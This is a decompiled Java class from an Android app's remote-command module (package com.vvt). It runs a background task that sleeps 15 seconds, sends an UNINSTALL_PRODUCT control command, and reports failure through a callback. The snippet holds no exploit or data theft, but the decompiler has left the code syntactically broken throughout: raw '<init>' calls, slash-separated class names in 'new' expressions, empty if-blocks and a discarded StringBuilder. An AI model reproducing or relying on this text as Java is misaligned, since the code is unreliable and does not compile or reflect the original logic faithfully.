package com.vvt.remotecommand.processor.a;

import com.vvt.remotecommand.RemoteCommand;
import com.vvt.remotecommand.exception.RemoteCommandException;
import com.vvt.remotecommand.processor.RemoteCommandProcessor;
import com.vvt.remotecommand.processor.c;
import com.vvt.remotecontrol.ControlCommand;
import com.vvt.remotecontrol.RemoteFunction;
import com.vvt.remotecontrol.a;

class e
  implements Runnable
{
  e(d paramd, a parama, c paramc, RemoteCommand paramRemoteCommand) {}
  
  public void run()
  {
    try
    {
      boolean bool1 = d.a();
      if (bool1) {}
      long l = 15000L;
      Thread.sleep(l);
      Object localObject1 = new com/vvt/remotecontrol/ControlCommand;
      localObject2 = RemoteFunction.UNINSTALL_PRODUCT;
      localObject3 = null;
      ((ControlCommand)localObject1).<init>((RemoteFunction)localObject2, null);
      boolean bool2 = d.a();
      if (bool2) {}
      localObject2 = this.a;
      localObject1 = ((a)localObject2).execute((ControlCommand)localObject1);
      localObject1 = (Boolean)localObject1;
      bool1 = ((Boolean)localObject1).booleanValue();
      if (!bool1)
      {
        localObject1 = this.b;
        if (localObject1 != null)
        {
          localObject1 = this.b;
          localObject2 = this.c;
          localObject3 = this.d;
          localObject4 = new com/vvt/remotecommand/exception/RemoteCommandException;
          localObject5 = "Uninstall failed.";
          ((RemoteCommandException)localObject4).<init>((String)localObject5);
          ((c)localObject1).a((RemoteCommand)localObject2, (RemoteCommandProcessor)localObject3, (RemoteCommandException)localObject4);
        }
      }
      return;
    }
    catch (Exception localException)
    {
      for (;;)
      {
        Object localObject2 = this.b;
        Object localObject3 = this.c;
        Object localObject4 = this.d;
        Object localObject5 = new com/vvt/remotecommand/exception/RemoteCommandException;
        StringBuilder localStringBuilder = new java/lang/StringBuilder;
        localStringBuilder.<init>();
        String str2 = "Uninstall failed: ";
        localStringBuilder = localStringBuilder.append(str2);
        String str1 = localException.getMessage();
        str1 = str1;
        ((RemoteCommandException)localObject5).<init>(str1);
        ((c)localObject2).a((RemoteCommand)localObject3, (RemoteCommandProcessor)localObject4, (RemoteCommandException)localObject5);
      }
    }
  }
}


/* Location:              /Volumes/D1/codebase/android/POC/assets/product/maind/classes-enjarify.jar!/com/vvt/remotecommand/processor/a/e.class
 * Java compiler version: 5 (49.0)
 * JD-Core Version:       0.7.1
 */